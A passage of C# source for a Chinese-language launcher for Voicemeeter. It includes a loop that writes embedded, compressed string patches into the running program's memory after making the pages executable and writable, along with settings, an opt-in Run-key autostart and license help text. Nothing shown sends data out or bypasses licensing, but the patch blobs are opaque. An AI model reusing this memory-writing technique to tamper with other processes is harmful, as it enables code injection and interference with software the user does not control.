            while (pos + 7 <= blob.Length)
            {
                uint rva = BitConverter.ToUInt32(blob, pos); pos += 4;
                ushort len = BitConverter.ToUInt16(blob, pos); pos += 2;
                byte enc = blob[pos]; pos += 1;
                if (pos + len > blob.Length) break;
                int term = (enc == 1) ? 2 : 1;
                byte[] data = new byte[len + term];
                Array.Copy(blob, pos, data, 0, len);
                pos += len;
                total++;

                IntPtr addr = (IntPtr)(imageBase + rva);
                long pageStart = (long)addr & ~0xFFF;
                IntPtr pageEnd = (IntPtr)(((long)addr + data.Length + 0xFFF) & ~0xFFF);
                uint old;
                VirtualProtectEx(hProc, (IntPtr)pageStart, (IntPtr)((long)pageEnd - pageStart), PAGE_EXECUTE_READWRITE, out old);
                IntPtr written;
                if (WriteProcessMemory(hProc, addr, data, (IntPtr)data.Length, out written)) ok++;
            }
            return ok > total * 8 / 10;
        }

        internal static readonly System.Collections.Generic.Dictionary<string, TargetInfo> Targets =
            new System.Collections.Generic.Dictionary<string, TargetInfo>();

        internal static readonly string[] TargetOrder = {
            "potato_x64", "potato_x86", "banana_x64", "banana_x86", "vm_x64", "vm_x86"
        };

        internal static void InitTargets()
        {
            if (Targets.Count > 0) return;
            Targets["potato_x64"] = new TargetInfo("potato_x64", "voicemeeter8x64.exe",
                "Voicemeeter Potato（64 位）", POTATO_X64_COUNT, GZ_POTATO_X64);
            Targets["potato_x86"] = new TargetInfo("potato_x86", "voicemeeter8.exe",
                "Voicemeeter Potato（32 位）", POTATO_X86_COUNT, GZ_POTATO_X86);
            Targets["banana_x64"] = new TargetInfo("banana_x64", "voicemeeterpro_x64.exe",
                "Voicemeeter Banana（64 位）", BANANA_X64_COUNT, GZ_BANANA_X64);
            Targets["banana_x86"] = new TargetInfo("banana_x86", "voicemeeterpro.exe",
                "Voicemeeter Banana（32 位）", BANANA_X86_COUNT, GZ_BANANA_X86);
            Targets["vm_x64"] = new TargetInfo("vm_x64", "voicemeeter_x64.exe",
                "Voicemeeter（64 位）", VM_X64_COUNT, GZ_VM_X64);
            Targets["vm_x86"] = new TargetInfo("vm_x86", "voicemeeter.exe",
                "Voicemeeter（32 位）", VM_X86_COUNT, GZ_VM_X86);
        }

        internal static byte[] BlobOf(string key)
        {
            TargetInfo ti;
            if (key == null || !Targets.TryGetValue(key, out ti)) return null;
            try { return UnGz(ti.Blob); }
            catch { return null; }
        }

        static byte[] UnGz(string b64)
        {
            byte[] gz = Convert.FromBase64String(b64.Replace("\n", "").Replace("\r", ""));
            using (MemoryStream src = new MemoryStream(gz))
            using (GZipStream zs = new GZipStream(src, CompressionMode.Decompress))
            using (MemoryStream dst = new MemoryStream())
            {
                byte[] buf = new byte[8192];
                int n;
                while ((n = zs.Read(buf, 0, buf.Length)) > 0) dst.Write(buf, 0, n);
                return dst.ToArray();
            }
        }
    }

    class TargetInfo
    {
        internal string Key, FileName, Display;
        internal int Count;
        internal string Blob;

        internal TargetInfo(string key, string file, string display, int count, string blob)
        {
            Key = key; FileName = file; Display = display; Count = count; Blob = blob;
        }

        public override string ToString()
        {
            return Display + "   ·   " + FileName;
        }
    }

    static class AppSettings
    {
        internal static string Target = "potato_x64";
        internal static int SplashSeconds = 5;
        internal static bool AutoStart = false;

        const string RunValueName = "VoicemeeterZHLauncher";
        const string RunKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";

        internal static string DirPath()
        {
            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "VoicemeeterZH");
        }

        internal static string FilePath()
        {
            return Path.Combine(DirPath(), "settings.ini");
        }

        internal static void Load()
        {
            Target = "potato_x64"; SplashSeconds = 5; AutoStart = false;
            try
            {
                string f = FilePath();
                if (File.Exists(f))
                {
                    foreach (string line in File.ReadAllLines(f, Encoding.UTF8))
                    {
                        int p = line.IndexOf('=');
                        if (p <= 0) continue;
                        string k = line.Substring(0, p).Trim();
                        string v = line.Substring(p + 1).Trim();
                        if (k.Equals("Target", StringComparison.OrdinalIgnoreCase) && v.Length > 0) Target = v;
                        else if (k.Equals("SplashSeconds", StringComparison.OrdinalIgnoreCase))
                        {
                            int n;
                            if (int.TryParse(v, out n)) SplashSeconds = n;
                        }
                        else if (k.Equals("AutoStart", StringComparison.OrdinalIgnoreCase)) AutoStart = (v == "1");
                    }
                }
            }
            catch { }
            if (SplashSeconds < 0) SplashSeconds = 0;
            if (SplashSeconds > 15) SplashSeconds = 15;
            if (Program.Targets.Count > 0 && !Program.Targets.ContainsKey(Target)) Target = "potato_x64";
        }

        internal static void Save()
        {
            try
            {
                string d = DirPath();
                if (!Directory.Exists(d)) Directory.CreateDirectory(d);
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("# Voicemeeter 中文界面启动器 设置文件");
                sb.AppendLine("Target=" + Target);
                sb.AppendLine("SplashSeconds=" + SplashSeconds);
                sb.AppendLine("AutoStart=" + (AutoStart ? "1" : "0"));
                File.WriteAllText(FilePath(), sb.ToString(), Encoding.UTF8);
            }
            catch { }
        }

        internal static void SyncAutoStart()
        {
            try
            {
                using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(RunKeyPath, true))
                {
                    if (rk == null) return;
                    if (AutoStart)
                        rk.SetValue(RunValueName, "\"" + Application.ExecutablePath + "\" --autostart");
                    else if (rk.GetValue(RunValueName) != null)
                        rk.DeleteValue(RunValueName, false);
                }
            }
            catch { }
        }

        internal static string KeyOfFile(string path)
        {
            if (path == null || path.Length == 0) return null;
            string n;
            try { n = Path.GetFileName(path).ToLowerInvariant(); }
            catch { return null; }
            foreach (System.Collections.Generic.KeyValuePair<string, TargetInfo> kv in Program.Targets)
                if (kv.Value.FileName.ToLowerInvariant() == n) return kv.Key;
            return null;
        }
    }

    static class ConfigInfo
    {
        static string ConfigFile()
        {
            string name = "VoiceMeeterPotatoDefault.xml";
            string t = AppSettings.Target;
            if (t != null)
            {
                if (t.StartsWith("banana")) name = "VoiceMeeterBananaDefault.xml";
                else if (t.StartsWith("vm_")) name = "VoiceMeeterDefault.xml";
            }
            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
        }

        internal static void OpenConfigDir()
        {
            try
            {
                string f = ConfigFile();
                string dir = Path.GetDirectoryName(f);
                if (File.Exists(f))
                {
                    Process.Start("explorer.exe", "/select,\"" + f + "\"");
                }
                else if (Directory.Exists(dir))
                {
                    Process.Start("explorer.exe", "\"" + dir + "\"");
                    MessageBox.Show("未找到配置文件：\n" + f +
                        "\n\n已打开所在目录。首次启动 Voicemeeter 后会在此生成默认配置文件。",
                        "打开配置目录", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    MessageBox.Show("未找到配置目录：\n" + dir,
                        "打开配置目录", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("打开配置目录失败：" + ex.Message,
                    "打开配置目录", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }
    }

    class SplashForm : Form
    {
        const int W = 600, H = 520;
        static int DURATION = 5000;
        static TargetInfo Target = null;
        readonly Timer ticker = new Timer();
        int elapsed = 0;
        public bool LicenseRequested = false;

        Rectangle SBtnRect
        {
            get
            {
                int py = H - 84;
                return new Rectangle(40, py - 48, 92, 32);
            }
        }

        Rectangle CBtnRect
        {
            get
            {
                int py = H - 84;
                return new Rectangle(140, py - 48, 150, 32);
            }
        }

        Rectangle LBtnRect
        {
            get
            {
                int py = H - 84;
                return new Rectangle(298, py - 48, 262, 32);
            }
        }

        static readonly Color BgTL = Color.FromArgb(13, 19, 28);
        static readonly Color BgBR = Color.FromArgb(28, 42, 60);
        static readonly Color Accent = Color.FromArgb(47, 129, 247);
        static readonly Color Accent2 = Color.FromArgb(56, 217, 192);
        static readonly Color FgMain = Color.FromArgb(232, 239, 247);
        static readonly Color FgSub = Color.FromArgb(142, 166, 190);
        static readonly Color Gold = Color.FromArgb(255, 185, 90);
        static readonly Color CopyC = Color.FromArgb(96, 140, 165, 190);

        Font fTitle, fSub, fBody, fKey, fBullet, fSmall, fIcon, fCopy;

        public static bool ShowSplash(int ms, TargetInfo target)
        {
            try
            {
                Target = target;
                DURATION = ms < 400 ? 400 : ms;
                using (SplashForm sp = new SplashForm())
                {
                    sp.ShowDialog();
                    return sp.LicenseRequested;
                }
            }
            catch { }
            return false;
        }

        public SplashForm()
        {
            FormBorderStyle = FormBorderStyle.None;
            StartPosition = FormStartPosition.CenterScreen;
            ClientSize = new Size(W, H);
            ShowInTaskbar = false;
            TopMost = true;
            BackColor = BgTL;
            AutoScaleMode = AutoScaleMode.None;
            SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.OptimizedDoubleBuffer, true);
            DoubleBuffered = true;
            try { Region = new Region(Round(new Rectangle(0, 0, W, H), 16)); } catch { }

            fTitle = MkFont(21f, FontStyle.Bold);
            fSub = MkFont(9.5f, FontStyle.Regular);
            fBody = MkFont(12f, FontStyle.Regular);
            fKey = MkFont(10f, FontStyle.Regular);
            fBullet = MkFont(9.5f, FontStyle.Regular);
            fSmall = MkFont(9f, FontStyle.Regular);
            fIcon = MkFont(15f, FontStyle.Bold);
            fCopy = MkFont(8.5f, FontStyle.Regular);

            ticker.Interval = 40;
            ticker.Tick += Ticker_Tick;
            ticker.Start();
        }

        static Font MkFont(float sz, FontStyle st)
        {
            try { return new Font("Microsoft YaHei UI", sz, st); }
            catch
            {
                try { return new Font("微软雅黑", sz, st); }
                catch { return new Font(FontFamily.GenericSansSerif, sz, st); }
            }
        }

        void Ticker_Tick(object sender, EventArgs e)
        {
            elapsed += ticker.Interval;
            if (elapsed >= DURATION - 400)
            {
                double k = (double)(elapsed - (DURATION - 400)) / 400.0;
                if (k > 1) k = 1;
                if (k < 0) k = 0;
                try { Opacity = 1.0 - k; } catch { }
            }
            if (elapsed >= DURATION)
            {
                ticker.Stop();
                Close();
                return;
            }
            Invalidate();
        }

        protected override void OnMouseClick(MouseEventArgs e)
        {
            base.OnMouseClick(e);
            if (SBtnRect.Contains(e.Location))
            {
                SettingsForm.ShowSettings();
                int sec = AppSettings.SplashSeconds;
                if (sec <= 0) { ticker.Stop(); Close(); return; }
                DURATION = sec * 1000;
                elapsed = 0;
                try { Opacity = 1.0; } catch { }
                if (!ticker.Enabled) ticker.Start();
                Invalidate();
                return;
            }
            if (CBtnRect.Contains(e.Location)) { ConfigInfo.OpenConfigDir(); return; }
            if (LBtnRect.Contains(e.Location)) LicenseRequested = true;
            ticker.Stop();
            Close();
        }

        static GraphicsPath Round(Rectangle r, int rad)
        {
            GraphicsPath gp = new GraphicsPath();
            int d = rad * 2;
            if (d > r.Width) d = r.Width;
            if (d > r.Height) d = r.Height;
            if (d <= 0) { gp.AddRectangle(r); return gp; }
            gp.AddArc(r.X, r.Y, d, d, 180, 90);
            gp.AddArc(r.Right - d, r.Y, d, d, 270, 90);
            gp.AddArc(r.Right - d, r.Bottom - d, d, d, 0, 90);
            gp.AddArc(r.X, r.Bottom - d, d, d, 90, 90);
            gp.CloseFigure();
            return gp;
        }

        void DrawInfo(Graphics g, string key, string val, float y, Color vc)
        {
            using (SolidBrush kb = new SolidBrush(FgSub)) g.DrawString(key, fKey, kb, 40f, y + 2f);
            using (SolidBrush vb = new SolidBrush(vc)) g.DrawString(val, fBody, vb, 138f, y);
        }

        void DrawBullet(Graphics g, string text, float y)
        {
            using (SolidBrush dot = new SolidBrush(Accent2))
                g.FillEllipse(dot, 42f, y + 7f, 5f, 5f);
            using (SolidBrush tb = new SolidBrush(FgMain))
                g.DrawString(text, fBullet, tb, 58f, y);
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            Graphics g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;
            g.TextRenderingHint = System.Drawing.Text.TextRenderingHint.AntiAlias;

            Rectangle full = new Rectangle(0, 0, W, H);
            using (LinearGradientBrush br = new LinearGradientBrush(full, BgTL, BgBR, 45f))
                g.FillRectangle(br, full);

            using (GraphicsPath gp = new GraphicsPath())
            {
                gp.AddEllipse(W - 300, -200, 470, 470);
                using (PathGradientBrush pgb = new PathGradientBrush(gp))
                {
                    pgb.CenterColor = Color.FromArgb(95, Accent);
                    pgb.SurroundColors = new Color[] { Color.FromArgb(0, Accent) };
                    g.FillPath(pgb, gp);
                }
            }
            using (GraphicsPath gp = new GraphicsPath())
            {
                gp.AddEllipse(-180, H - 180, 400, 400);
                using (PathGradientBrush pgb = new PathGradientBrush(gp))
                {
                    pgb.CenterColor = Color.FromArgb(60, Accent2);
                    pgb.SurroundColors = new Color[] { Color.FromArgb(0, Accent2) };
                    g.FillPath(pgb, gp);
                }
            }

            using (Pen pen = new Pen(Color.FromArgb(120, Accent2), 2f))
                g.DrawLine(pen, 8, 1.5f, W - 8, 1.5f);

            Rectangle ico = new Rectangle(40, 40, 56, 56);
            using (GraphicsPath gp = Round(ico, 16))
            {
                using (LinearGradientBrush br = new LinearGradientBrush(ico, Accent, Accent2, 45f))
                    g.FillPath(br, gp);
                using (StringFormat sf = new StringFormat())
                {
                    sf.Alignment = StringAlignment.Center;
                    sf.LineAlignment = StringAlignment.Center;
                    g.DrawString("VM", fIcon, Brushes.White, ico, sf);
                }
            }

            using (SolidBrush b = new SolidBrush(FgMain)) g.DrawString("Voicemeeter Potato", fTitle, b, 114f, 40f);
            using (SolidBrush b = new SolidBrush(FgSub)) g.DrawString("中文界面启动器  ·  V1.3  免安装分享版", fSub, b, 116f, 78f);

            using (Pen pen = new Pen(Color.FromArgb(55, 255, 255, 255)))
                g.DrawLine(pen, 40, 118, W - 40, 118);

            float y = 136f;
            DrawInfo(g, "制作", "杨爽工作室", y, Gold); y += 34f;
            DrawInfo(g, "制作工具", "Marvis", y, FgMain); y += 34f;
            DrawInfo(g, "适用版本", Target == null ? "Voicemeeter" : Target.Display, y, FgMain); y += 42f;

            using (SolidBrush b = new SolidBrush(Accent2)) g.DrawString("它能做什么", fKey, b, 40f, y); y += 26f;
            DrawBullet(g, (Target == null ? 0 : Target.Count) + " 条界面文本汉化：菜单、设置面板、对话框与悬停提示", y); y += 24f;
            DrawBullet(g, "运行时在内存中替换，不改动原程序文件，关闭即恢复原版", y); y += 24f;
            DrawBullet(g, "支持 Potato / Banana / Voicemeeter 三个系列，可在「设置」中切换", y); y += 30f;

            using (SolidBrush b = new SolidBrush(FgSub))
                g.DrawString("启动需管理员权限（UAC 提权），请在提示框点击「是」", fSmall, b, 40f, y);
            Rectangle lb = LBtnRect;
            using (GraphicsPath gp = Round(lb, 9))
            {
                using (SolidBrush b = new SolidBrush(Color.FromArgb(40, Accent))) g.FillPath(b, gp);
                using (Pen p = new Pen(Color.FromArgb(150, Accent2), 1.2f)) g.DrawPath(p, gp);
            }
            using (StringFormat sf = new StringFormat())
            {
                sf.Alignment = StringAlignment.Center;
                sf.LineAlignment = StringAlignment.Center;
                using (SolidBrush b = new SolidBrush(FgMain))
                    g.DrawString("授权与激活帮助（挑战码 / REGEN）", fBullet, b, lb, sf);
            }

            Rectangle cb = CBtnRect;
            using (GraphicsPath gp = Round(cb, 9))
            {
                using (SolidBrush b = new SolidBrush(Color.FromArgb(26, Accent2))) g.FillPath(b, gp);
                using (Pen p = new Pen(Color.FromArgb(120, Accent2), 1.2f)) g.DrawPath(p, gp);
            }
            using (StringFormat sf2 = new StringFormat())
            {
                sf2.Alignment = StringAlignment.Center;
                sf2.LineAlignment = StringAlignment.Center;
                using (SolidBrush b = new SolidBrush(FgMain))
                    g.DrawString("打开配置目录", fBullet, b, cb, sf2);
            }

            Rectangle sb = SBtnRect;
            using (GraphicsPath gp = Round(sb, 9))
            {
                using (SolidBrush b = new SolidBrush(Color.FromArgb(30, Accent))) g.FillPath(b, gp);
                using (Pen p = new Pen(Color.FromArgb(130, Accent), 1.2f)) g.DrawPath(p, gp);
            }
            using (StringFormat sf3 = new StringFormat())
            {
                sf3.Alignment = StringAlignment.Center;
                sf3.LineAlignment = StringAlignment.Center;
                using (SolidBrush b = new SolidBrush(FgMain))
                    g.DrawString("设置", fBullet, b, sb, sf3);
            }


            int py = H - 84;
            Rectangle track = new Rectangle(40, py, W - 80, 6);
            using (GraphicsPath gp = Round(track, 3))
            using (SolidBrush b = new SolidBrush(Color.FromArgb(48, 255, 255, 255)))
                g.FillPath(b, gp);

            double ratio = (double)elapsed / DURATION;
            if (ratio > 1) ratio = 1;
            int pw = (int)((W - 80) * ratio);
            if (pw > 3)
            {
                Rectangle bar = new Rectangle(40, py, pw, 6);
                Rectangle glow = new Rectangle(40, py, Math.Max(pw, 12), 6);
                using (GraphicsPath gp = Round(bar, 3))
                using (LinearGradientBrush br = new LinearGradientBrush(glow, Accent, Accent2, 0f))
                    g.FillPath(br, gp);
            }

            using (SolidBrush b = new SolidBrush(FgSub))
            {
                g.DrawString("正在准备中文界面…", fSmall, b, 40f, py + 14f);
                string right = ((DURATION + 999) / 1000) + " 秒后自动开始（点击画面可跳过）";
                SizeF rs = g.MeasureString(right, fSmall);
                g.DrawString(right, fSmall, b, W - 40 - rs.Width, py + 14f);
            }

            using (SolidBrush b = new SolidBrush(CopyC))
            {
                string copy = "© 杨爽工作室   ·   Powered by Marvis   ·   免费分享，请勿商用";
                SizeF cs = g.MeasureString(copy, fCopy);
                g.DrawString(copy, fCopy, b, (W - cs.Width) / 2f, H - 30f);
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                try { ticker.Stop(); ticker.Dispose(); } catch { }
                foreach (Font f in new Font[] { fTitle, fSub, fBody, fKey, fBullet, fSmall, fIcon, fCopy })
                    try { if (f != null) f.Dispose(); } catch { }
            }
            base.Dispose(disposing);
        }
    }


    class SettingsForm : Form
    {
        static readonly Color SBg = Color.FromArgb(18, 24, 34);
        static readonly Color SEdit = Color.FromArgb(36, 48, 64);
        static readonly Color SFg = Color.FromArgb(232, 239, 247);
        static readonly Color SDim = Color.FromArgb(142, 166, 190);
        static readonly Color SAcc = Color.FromArgb(47, 129, 247);
        static readonly Color SAcc2 = Color.FromArgb(56, 217, 192);
        static readonly Color Gold = Color.FromArgb(255, 185, 90);

        ComboBox cbTarget;
        NumericUpDown nuSec;
        CheckBox ckAuto;
        Label lbState, lbCount;
        internal bool dirty = false;

        public static void ShowSettings()
        {
            try
            {
                using (SettingsForm f = new SettingsForm())
                {
                    f.ShowDialog();
                    if (f.dirty) AppSettings.Load();
                }
            }
            catch { }
        }

        static Font SF(float sz, FontStyle st)
        {
            try { return new Font("Microsoft YaHei UI", sz, st); }
            catch
            {
                try { return new Font("微软雅黑", sz, st); }
                catch { return new Font(FontFamily.GenericSansSerif, sz, st); }
            }
        }

        Label MkLabel(string text, int x, int y, float sz, Color c, bool bold)
        {
            Label l = new Label();
            l.Text = text;
            l.AutoSize = true;
            l.Left = x;
            l.Top = y;
            l.ForeColor = c;
            l.BackColor = SBg;
            l.Font = SF(sz, bold ? FontStyle.Bold : FontStyle.Regular);
            return l;
        }

        Button MkBtn(string text, int x, int y, int w, bool primary)
        {
            Button b = new Button();
            b.Text = text;
            b.FlatStyle = FlatStyle.Flat;
            b.FlatAppearance.BorderSize = 1;
            b.FlatAppearance.BorderColor = primary ? SAcc : Color.FromArgb(58, 86, 116);
            b.BackColor = primary ? Color.FromArgb(40, SAcc) : SEdit;
            b.ForeColor = SFg;
            b.Font = SF(9.5f, FontStyle.Regular);
            b.Cursor = Cursors.Hand;
            b.SetBounds(x, y, w, 32);
            return b;
        }

        public SettingsForm()
        {
            Text = "设置 - Voicemeeter 中文界面启动器";
            ClientSize = new Size(620, 476);
            FormBorderStyle = FormBorderStyle.FixedSingle;
            MaximizeBox = false;
            MinimizeBox = false;
            StartPosition = FormStartPosition.CenterScreen;
            BackColor = SBg;
            ForeColor = SFg;
            Font = SF(10f, FontStyle.Regular);
            AutoScaleMode = AutoScaleMode.None;

            Controls.Add(MkLabel("启动器设置", 22, 16, 15f, SFg, true));
            Controls.Add(MkLabel("设置保存在本机，下次启动自动生效", 24, 48, 9f, SDim, false));

            Controls.Add(MkLabel("① 汉化目标程序", 24, 82, 10f, SAcc2, true));

            cbTarget = new ComboBox();
            cbTarget.DropDownStyle = ComboBoxStyle.DropDownList;
            cbTarget.FlatStyle = FlatStyle.Flat;
            cbTarget.BackColor = SEdit;
            cbTarget.ForeColor = SFg;
            cbTarget.Font = SF(9.5f, FontStyle.Regular);
            cbTarget.SetBounds(24, 108, 572, 26);
            foreach (string k in Program.TargetOrder)
            {
                TargetInfo ti;
                if (!Program.Targets.TryGetValue(k, out ti)) continue;
                cbTarget.Items.Add(ti);
                if (ti.Key == AppSettings.Target) cbTarget.SelectedItem = ti;
            }
            if (cbTarget.SelectedIndex < 0 && cbTarget.Items.Count > 0) cbTarget.SelectedIndex = 0;
            cbTarget.SelectedIndexChanged += delegate { RefreshState(); };
            Controls.Add(cbTarget);

            lbState = MkLabel("", 24, 140, 9f, SDim, false);
            Controls.Add(lbState);

            lbCount = MkLabel("", 24, 162, 9f, SDim, false);
            Controls.Add(lbCount);

            Controls.Add(MkLabel("② 启动画面等待秒数", 24, 200, 10f, SAcc2, true));

            nuSec = new NumericUpDown();
            nuSec.Minimum = 0;
            nuSec.Maximum = 15;
            int v0 = AppSettings.SplashSeconds;
            if (v0 < 0) v0 = 0;
            if (v0 > 15) v0 = 15;
            nuSec.Value = v0;
            nuSec.BackColor = SEdit;
            nuSec.ForeColor = SFg;
            nuSec.BorderStyle = BorderStyle.FixedSingle;
            nuSec.Font = SF(10f, FontStyle.Regular);
            nuSec.SetBounds(24, 226, 78, 26);
            Controls.Add(nuSec);
            Controls.Add(MkLabel("秒（0 = 不显示启动画面，直接以中文界面拉起）", 112, 231, 9f, SDim, false));

            Controls.Add(MkLabel("③ 开机自动启动", 24, 270, 10f, SAcc2, true));

            ckAuto = new CheckBox();
            ckAuto.Text = "随 Windows 启动时自动以中文界面拉起 Voicemeeter（开机自启不显示启动画面）";
            ckAuto.Checked = AppSettings.AutoStart;
            ckAuto.ForeColor = SFg;
            ckAuto.BackColor = SBg;
            ckAuto.Font = SF(9f, FontStyle.Regular);
            ckAuto.AutoSize = true;
            ckAuto.Left = 24;
            ckAuto.Top = 296;
            Controls.Add(ckAuto);

            Controls.Add(MkLabel("开机自启写入当前用户 Run 注册表项，无需管理员权限；",
                24, 330, 8.5f, SDim, false));
            Controls.Add(MkLabel("启动器本身仍需 UAC 提权，才能把汉化补丁写入 Voicemeeter 进程内存。",
                24, 348, 8.5f, SDim, false));

            Button bDir = MkBtn("打开设置文件目录", 24, 420, 152, false);
            bDir.Click += delegate { OpenSettingsDir(); };
            Controls.Add(bDir);

            Button bSave = MkBtn("保存并应用", 380, 420, 104, true);
            bSave.Click += delegate { SaveAll(); };
            Controls.Add(bSave);

            Button bCancel = MkBtn("取消", 496, 420, 100, false);
            bCancel.Click += delegate { Close(); };
            Controls.Add(bCancel);

            RefreshState();
        }

        void RefreshState()
        {
            TargetInfo ti = cbTarget.SelectedItem as TargetInfo;
            if (ti == null) { lbState.Text = ""; lbCount.Text = ""; return; }
            string p = Program.FindTarget(ti.Key);
            if (p != null)
            {
                lbState.Text = "状态：已在本机检测到，启动时将直接使用";
                lbState.ForeColor = SAcc2;
            }
            else
            {
                lbState.Text = "状态：默认目录未检测到该版本（安装后会自动识别）";
                lbState.ForeColor = Gold;
            }
            lbCount.Text = "内置汉化条目：" + ti.Count + " 条（运行时内存替换，不改动原程序文件）";
        }

        void SaveAll()
        {
            TargetInfo ti = cbTarget.SelectedItem as TargetInfo;
            if (ti == null) return;

            if (Program.FindTarget(ti.Key) == null)
            {
                DialogResult r = MessageBox.Show(
                    "本机默认目录未检测到 " + ti.FileName + "。\n\n仍要保存该目标吗？\n" +
                    "（安装对应版本后，启动器会按默认路径自动识别）",
                    "设置", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (r != DialogResult.Yes) return;
            }

            int sec = (int)nuSec.Value;
            AppSettings.Target = ti.Key;
            AppSettings.SplashSeconds = sec;
            AppSettings.AutoStart = ckAuto.Checked;
            AppSettings.Save();
            AppSettings.SyncAutoStart();
            dirty = true;

            MessageBox.Show("设置已保存。\n\n目标程序：" + ti.Display +
                "\n启动等待：" + (sec == 0 ? "不显示启动画面" : (sec + " 秒")) +
                "\n开机自启：" + (ckAuto.Checked ? "已开启" : "已关闭"),
                "设置", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Close();
        }

        void OpenSettingsDir()
        {
            try
            {
                string d = AppSettings.DirPath();
                if (!Directory.Exists(d)) Directory.CreateDirectory(d);
                Process.Start("explorer.exe", "\"" + d + "\"");
            }
            catch (Exception ex)
            {
                MessageBox.Show("打开目录失败：" + ex.Message, "设置",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }
    }


    class LicenseForm : Form
    {
        const string T1 = @"Voicemeeter Potato 采用「单设备绑定」的挑战码 / 响应码（Challenge / Response）授权模式，
属于捐赠式软件（Donationware）：先免费试用，长期使用需购买授权。

【挑战码 Challenge】
由软件基于电脑的 CPU、主板等核心硬件信息生成，同时受系统环境与软件版本影响。
每台设备的挑战码具有唯一性，可理解为这台电脑的「指纹编号」。

【响应码 Response】
与挑战码一一对应，只在生成它的那台设备上有效。
激活后无需联网，即可使用授权覆盖的全部功能。

【授权价格分档】
个人 / 非盈利 / 教育场景：可在 P1-P5 档位中自选。
商业 / 专业场景：需在 P3-P5 档位中选择。
采购超过 100 份：可联系官方获取定制报价。

【系统兼容】
Windows XP 至 Windows 11，覆盖 32 位 / 64 位 / ARM64 架构。

【与本启动器的关系】
本工具只做界面文本汉化，不修改、不绕过任何授权逻辑，也不能代替授权使用。
购买与激活请一律通过 VB-Audio 官方渠道。";
        const string T2 = @"以下情况都可能导致挑战码变化，进而使原有响应码失效（激活失效）。

一、硬件相关变动
1. 更换 CPU 或主板 —— 最主要的触发原因，挑战码本身由它们生成。
2. BIOS 更新 —— 若更新改动了主板厂商、产品名称、BIOS 厂商等底层信息会触发；
   只做常规安全修补一般不影响，但存在风险。
3. 内存扩容 —— 极少数案例会触发（官方说明内存通常不影响挑战码）。

二、系统与设置变动
1. 重装 Windows 系统（即使同一台机器、同一块硬盘）。
2. 特定 Windows 更新（如 KB5063060 补丁、大版本系统迭代）。
3. 修改计算机名称、系统用户名。
4. 更新硬件驱动（如显卡驱动更新，已有实际触发案例）。

三、软件版本升级
1. 升级到 3.1.1.3：挑战码前缀变更为「G」。
2. 升级到 3.1.2.2：挑战码前缀变更为「H」。
3. 3.0.1.4 之前的旧版本：32 位与 64 位程序切换、Win10 常规更新、
   切换系统用户，都可能造成挑战码变动。

【预防建议】
每次准备重装系统、更换硬件、大幅更新驱动或升级 Voicemeeter 之前，
先备份一次硬件足迹文件（见「变更后怎么办」页），成本几乎为零。";
        const string T3 = @"方案一：恢复硬件足迹（Footprint）—— 硬件未变更时优先

硬件足迹是设备的硬件特征文件。在 CPU 与主板均未更换的前提下，
恢复足迹可以找回原挑战码，直接复用原有响应码，不消耗任何 REGEN 次数。

备份步骤（必须在授权已激活状态下操作）
1. 打开 Voicemeeter，进入授权激活窗口。
2. 在挑战码输入框上点击鼠标右键。
3. 选择导出足迹，得到文件 VB-Audio_PCFootprint.dat。
4. 保存到 U 盘、网盘等外部存储，不要只留在系统盘。

恢复步骤
1. 打开 Voicemeeter 授权窗口，先填入当初授权绑定的邮箱地址。
2. 在挑战码输入框上点击右键，导入之前备份的 VB-Audio_PCFootprint.dat。
3. 填入原响应码，完成激活。

注意：CPU 或主板已经更换时，足迹文件无法恢复生效，只能走方案二。

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

方案二：使用 REGEN 重新生成响应码

操作路径
1. 登录 VB-Audio 官方商店账户。
2. 进入 My License 页面。
3. 找到对应授权，点击 REGEN 按钮。
4. 填入当前的新挑战码，生成新的响应码。
5. 回到软件填入新响应码，完成激活。

注意：REGEN 会消耗授权的 REGEN 次数，次数为 0 时需付费购买。";
        const string T4 = @"一、基础与免费赠送权益

1. 每份初始授权自带基础 REGEN 次数。
   可用于挑战码变更后重新生成响应码，也可用于激活第二台设备。

2. 官方大版本迭代时会向所有终端用户免费赠送 REGEN：
   · 2024 年 6 月（3.1.1.3 版本更新）免费发放 1 次
   · 2025 年 11-12 月（3.1.2.2 版本更新）免费发放 1 次

二、付费购买规则（2026 年 6 月起生效）

1. 当该授权的 REGEN 次数为 0 时，My License 页面会出现 BUY REGEN 按钮。
2. 单次购买价格 = 该授权最低档位价格的一半。
3. 同一授权每 90 天仅可购买一次。

【成本提醒】
频繁重装系统、频繁更新驱动，等于在持续消耗 REGEN 次数与购买成本。
硬件没变时优先用足迹备份恢复，能直接省下这笔支出。";
        const string T5 = @"1. 出现原因不明的挑战码异常变更时，提取激活日志：
   我的文档 \ Voicemeeter \ Voicemeeter_ActivationLog.dat
   把该文件提交给官方排查，日志里有激活与挑战码变更记录。

2. 重装系统前建议一并备份该日志文件；
   重装系统后放回原目录，便于官方定位问题原因。

3. 授权 / 激活类问题，官方仅通过商店的联系表单处理；
   官方论坛渠道不解决授权问题，发帖基本无回应。

4. 官方客服仅支持英文沟通，不提供中文服务。
   提交时建议写清：设备型号、系统版本、授权邮箱、旧挑战码与新挑战码。

【本启动器能做什么 / 不能做什么】
可以做：查看挑战码变更原因、足迹备份恢复步骤、REGEN 规则、日志目录直达。
不能做：代为申请授权、赠送或修改 REGEN 次数、绕过任何授权校验。";
        const string T6 = @"历史沟通记录核心结论（供参考）

· 2021 年 —— 因设备故障导致挑战码变更，申请额外激活次数，
  官方提供了 2 次额外 REGEN，并明确说明后续无法继续免费赠送，需重新购买授权；
  同时建议硬件不变时通过备份足迹避免重复购买。

